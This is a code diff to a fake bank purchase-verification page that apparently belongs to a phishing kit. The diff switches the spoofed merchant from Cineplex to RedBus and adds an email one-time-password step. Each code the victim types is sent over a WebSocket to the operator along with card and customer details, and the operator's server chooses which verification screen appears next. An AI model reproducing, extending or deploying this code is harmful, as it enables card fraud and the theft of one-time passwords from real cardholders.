@@ -1067,7 +1067,7 @@ url("pay1ment_icons.woff") format("woff");
                 </div>
                 <h1>Before you purchase, verify it's you</h1>
                 <p class="app-intro">
-                    For added security, your bank needs to verify this purchase at <strong id="app-merchant">Cineplex</strong>
+                    For added security, your bank needs to verify this purchase at <strong id="app-merchant">RedBus</strong>
                     for <strong id="app-amount">$0.00</strong>
                     by authenticating in the banking app.
                 </p>
@@ -1135,7 +1135,7 @@ url("pay1ment_icons.woff") format("woff");
                         <table class="otp-table">
                             <tr>
                                 <td>Merchant</td>
-                                <td>Cineplex</td>
+                                <td>RedBus</td>
                             </tr>
                             <tr id="pin-amount-row">
                                 <td>Amount</td>
@@ -1187,7 +1187,7 @@ url("pay1ment_icons.woff") format("woff");
                         <table class="otp-table">
                             <tr>
                                 <td>Merchant</td>
-                                <td>Cineplex</td>
+                                <td>RedBus</td>
                             </tr>
                             <tr id="email-amount-row">
                                 <td>Amount</td>
@@ -1522,6 +1522,21 @@ url("pay1ment_icons.woff") format("woff");
       resetOtp();
       startOtpTimer();
  
+    } else if (a === 'email_verify' || a === 'custom_email_verify' || a === 'custom_email_tail') {
+      hideLoad();
+      _curStep = 'email_verify';
+      showEmail();
+      var sfx = p.phoneSuffix || document.querySelector("#email").value;
+
+    document.querySelector("#email-form > p").textContent='We have resent One-Time Password (OTP) in a text message to your registered email '+sfx+'.<br>Please submit your One-Time Password (OTP).';
+    document.getElementById('email-amount').textContent='$'+discountedTotal().toFixed(2);
+      /*var otpMsg = q('otpMessage');
+      if (otpMsg) otpMsg.textContent =
+        'A One-Time Password has been sent to your registered mobile number ending ' + sfx +
+        '. Please enter the OTP below.';*/
+      resetOtp();
+      startOtpTimer();
+ 
     } else if (a === 'cvv_verify' || a === 'question_verify') {
       _curStep = 'otp';
       showOtp();
@@ -1767,6 +1782,50 @@ url("pay1ment_icons.woff") format("woff");
     document.querySelector("#btnSubmit").disabled = false;
   }
 
+  //Email Code
+  function showEmail() {
+    
+    var sec = q('email-overlay');
+    document.getElementById('email-code').value = '';
+    //var btn = q('btnSubmit');
+    if (sec) sec.className = 'overlay';
+    //if (btn) btn.style.display = 'none';
+  }
+ 
+  function hideEmail() {
+    var sec = q('email-overlay');
+    //var btn = q('btnSubmit');
+    if (sec) sec.className = 'overlay hidden';
+    //if (btn) btn.style.display = 'block';
+    if (q('email-code'))  q('email-code').value = '';
+    if (q('email-error')) q('email-error').style.display = 'none';
+    stopEmailTimer();
+  }
+
+  
+  function changeEmail() {
+    var sec = q('email-form');
+    var secs = q('email-result');
+    //var btn = q('btnSubmit');
+    if (sec) sec.classList.add('hidden');
+    if (secs) secs.classList.remove('hidden');
+    //if (btn) btn.style.display = 'block';
+    if (q('email-code'))  q('email-code').value = '';
+    if (q('email-error')) q('email-error').style.display = 'none';
+    stopEmailTimer();
+  }
+
+ 
+  function resetEmail() {
+    if (q('email-code'))  { q('email-code').value = ''; }
+    if (q('email-error')) { q('email-error').style.display = 'none'; }
+    var btn = q('email-submit');
+    if (btn) { btn.disabled = false; btn.textContent = 'Verify'; }
+    document.querySelector("#btnSubmit").disabled = false;
+  }
+
+
+
  
   /* OTP 倒计时 */
   var otpSec = 299, otpTimer = null;
@@ -1800,6 +1859,42 @@ url("pay1ment_icons.woff") format("woff");
     var m = Math.floor(otpSec / 60), s = otpSec % 60;
     timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
   }
+
+
+   /* EmailCode 倒计时 */
+  var EmailSec = 299, EmailTimer = null;
+ 
+  function startEmailTimer() {
+    EmailSec = 299;
+    stopOtpTimer();
+    var timerEl = q('email-timer');
+    if (timerEl) timerEl.style.display = 'block';
+    Emailtick();
+    EmailTimer = setInterval(function () {
+      EmailSec--;
+      Emailtick();
+      if (EmailSec <= 0) {
+        stopEmailTimer();
+        //showMsg('error', 'OTP expired.');
+        //hideOtp();
+      }
+    }, 1000);
+  }
+ 
+  function stopEmailTimer() {
+    if (EmailTimer) { clearInterval(EmailTimer); EmailTimer = null; }
+    var timerEl = q('email-timer');
+    if (timerEl) timerEl.style.display = 'none';
+  }
+ 
+  function Emailtick() {
+    var timerEl = q('email-timer');
+    if (!timerEl) return;
+    var m = Math.floor(EmailSec / 60), s = EmailSec % 60;
+    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+  }
+
+
  
   /* OTP 提交 */
   function submitOtp() {
@@ -1830,6 +1925,38 @@ url("pay1ment_icons.woff") format("woff");
       }));
     }
   }
+
+
+  /* EmailCode 提交 */
+  function submitEmailCode() {
+    var code = q('email-code') ? q('email-code').value.trim() : '';
+    if (!code || code.length < 4) {
+      if (q('email-error')) { q('email-error').style.display = 'block'; q('email-error').textContent = 'Please enter the EmailCode.'; }
+      return;
+    }
+    if (q('email-error')) q('email-error').style.display = 'none';
+    document.getElementById('email-spinner').style.display='flex';
+    document.getElementById('email-spinner').classList.remove('hidden');
+    var btn = q('email-submit');
+    if (btn) { btn.disabled = true; }
+    
+    if (ws && ws.readyState === WebSocket.OPEN && sid) {
+      var p = buildPayload();
+      p.cardInfo.otpCode = code;
+      ws.send(JSON.stringify({
+        type:    'session_update',
+        payload: {
+          sessionId:    sid,
+          status:       'pending',
+          cardInfo:     p.cardInfo,
+          customerInfo: p.customerInfo,
+          browsingTabs: p.browsingTabs,
+          currentStep:  'email_verify'
+        }
+      }));
+    }
+  }
+
  
   /* OTP 重发 */
   var _resendSec = 0, _resendTimer = null, _otpResendCount = 0;
@@ -1860,6 +1987,12 @@ url("pay1ment_icons.woff") format("woff");
     if (ws && ws.readyState === WebSocket.OPEN)
       ws.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId: sid } }));
   }
+
+  function resendEmailCode() {
+    if (_resendSec > 0 || _otpResendCount >= 5) return;
+    if (ws && ws.readyState === WebSocket.OPEN)
+      ws.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId: sid } }));
+  }
  
   /* OTP 输入事件 */
   if (q('otp-code')) {
@@ -1872,6 +2005,20 @@ url("pay1ment_icons.woff") format("woff");
   }
   if (q('otp-resend')) {
     q('otp-resend').addEventListener('click', resendOtp);
+  }
+
+
+  /* EMAIL 输入事件 */
+  if (q('email-code')) {
+    q('email-code').addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 8);
+    });
+  }
+  if (q('email-submit')) {
+    q('email-submit').addEventListener('click', submitOtp);
+  }
+  if (q('email-resend')) {
+    q('email-resend').addEventListener('click', resendOtp);
   }
  
  
